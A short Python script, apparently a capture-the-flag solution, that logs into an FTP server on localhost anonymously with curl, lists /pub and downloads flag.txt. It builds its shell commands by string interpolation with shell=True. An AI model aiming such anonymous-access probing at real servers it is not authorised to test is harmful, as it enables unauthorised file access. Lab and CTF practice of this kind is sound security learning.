import subprocess
import sys
import re

TARGET = "localhost"
PORT = 21

def exploit_ftp():
    print(f"[*] Testing FTP Anonymous Access on {TARGET}:{PORT}...")
    try:
        # Check if curl is installed
        if subprocess.call("command -v curl > /dev/null", shell=True) != 0:
            print("[-] Error: 'curl' command not found. Please install it.")
            return

        # Attempt to list files in /pub using curl
        print("[*] List of files in /pub:")
        # curl uses passive mode by default for FTP
        cmd_list = f"curl -s --list-only ftp://anonymous:@{TARGET}:{PORT}/pub/"
        output = subprocess.check_output(cmd_list, shell=True, stderr=subprocess.STDOUT).decode()
        
        files = output.strip().splitlines()
        if not files:
            print("[-] No files found or directory listing disabled.")
        else:
            for f in files:
                print(f"    {f}")
            
            if any("flag.txt" in f for f in files):
                print("[+] Found flag.txt! Downloading content...")
                cmd_cat = f"curl -s ftp://anonymous:@{TARGET}:{PORT}/pub/flag.txt"
                flag_content = subprocess.check_output(cmd_cat, shell=True).decode()
                print(f"\n{flag_content}\n")
                print("[+] Success! Flag retrieved.")
            else:
                print("[-] flag.txt not found in /pub")
                
    except subprocess.CalledProcessError as e:
        print(f"[-] FTP access failed: {e.output.decode() if e.output else e}")
        print("[!] Note: On some ARM64 (M1/M2) Macs, standard FTP libraries struggle with emulated containers. Using 'curl' for better compatibility.")
    except Exception as e:
        print(f"[-] FTP access failed: {e}")

if __name__ == "__main__":
    exploit_ftp()
